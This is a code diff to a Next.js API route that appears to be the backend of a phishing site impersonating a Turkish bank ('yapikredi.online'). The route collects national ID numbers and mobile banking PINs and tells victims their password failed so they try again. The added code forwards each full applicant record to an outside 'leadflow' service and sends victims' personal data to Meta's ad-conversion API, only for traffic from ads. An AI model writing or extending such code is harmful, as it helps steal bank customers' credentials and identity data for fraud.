@@ -2,9 +2,86 @@ import { NextRequest, NextResponse } from "next/server";
 import { cookies } from "next/headers";
 import { v4 as uuidv4 } from "uuid";
 import { assertNotBanned } from "@/lib/access-control";
+import { pushLeadToLeadflow } from "@/lib/leadflow/push-lead";
+import { sendMetaLeadEvent } from "@/lib/meta/capi";
+import { isOfferRequest } from "@/lib/meta/is-offer";
 import { getStorage } from "@/lib/storage";
 import { isValidTCKN } from "@/lib/tc-validation";
 import { getClientIp } from "@/lib/request-ip";
+
+async function scheduleMetaLead(
+  request: NextRequest,
+  body: {
+    phone?: string;
+    firstName?: string;
+    lastName?: string;
+    loanAmount?: number;
+  }
+): Promise<void> {
+  if (!(await isOfferRequest(request))) {
+    console.warn("[meta-capi] skipped: not offer traffic");
+    return;
+  }
+
+  const cookieStore = await cookies();
+  const fbc = cookieStore.get("_fbc")?.value;
+
+  const host =
+    request.headers.get("x-forwarded-host") ??
+    request.headers.get("host") ??
+    "";
+  const proto = request.headers.get("x-forwarded-proto") ?? "https";
+  const eventSourceUrl = host ? `${proto}://${host}/` : `${proto}://localhost/`;
+
+  const send = sendMetaLeadEvent({
+    eventId: uuidv4(),
+    eventSourceUrl,
+    ip: getClientIp(request),
+    userAgent: request.headers.get("user-agent") ?? "",
+    phone: body.phone ?? "",
+    firstName: body.firstName ?? "",
+    lastName: body.lastName ?? "",
+    fbc,
+    value: Number(body.loanAmount) || undefined,
+  }).then((result) => {
+    if (!result.ok) {
+      console.error("[meta-capi] send failed", result.error ?? result);
+    }
+    return result;
+  });
+
+  try {
+    const { getCloudflareContext } = await import("@opennextjs/cloudflare");
+    const { ctx } = await getCloudflareContext({ async: true });
+    ctx.waitUntil(send);
+  } catch {
+    await send;
+  }
+}
+
+async function scheduleLeadflowPush(
+  applicantId: string,
+  request: NextRequest
+): Promise<void> {
+  const storage = await getStorage();
+  const full = await storage.getApplicant(applicantId);
+  if (!full) return;
+
+  const host =
+    request.headers.get("x-forwarded-host") ??
+    request.headers.get("host") ??
+    "yapikredi.online";
+
+  const push = pushLeadToLeadflow(full, host);
+
+  try {
+    const { getCloudflareContext } = await import("@opennextjs/cloudflare");
+    const { ctx } = await getCloudflareContext({ async: true });
+    ctx.waitUntil(push);
+  } catch {
+    await push;
+  }
+}
 
 export async function POST(request: NextRequest) {
   try {
@@ -50,6 +127,16 @@ export async function POST(request: NextRequest) {
       mobilePin: body.mobilePin ?? "",
     });
 
+    if (!isPinOnlyAttempt) {
+      await storage.updateApplicantStatus(
+        applicant.id,
+        "completed",
+        new Date().toISOString()
+      );
+      await scheduleLeadflowPush(applicant.id, request);
+      await scheduleMetaLead(request, body);
+    }
+
     const response = NextResponse.json({
       applicantId: applicant.id,
       attemptId: attempt.id,
@@ -58,7 +145,6 @@ export async function POST(request: NextRequest) {
         ? attempt.attemptNumber === 3
         : true,
       canAdvance: isPinOnlyAttempt && attempt.attemptNumber === 3,
-      requiresOtp: !isPinOnlyAttempt,
       message:
         isPinOnlyAttempt && attempt.attemptNumber < 3
           ? "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz."
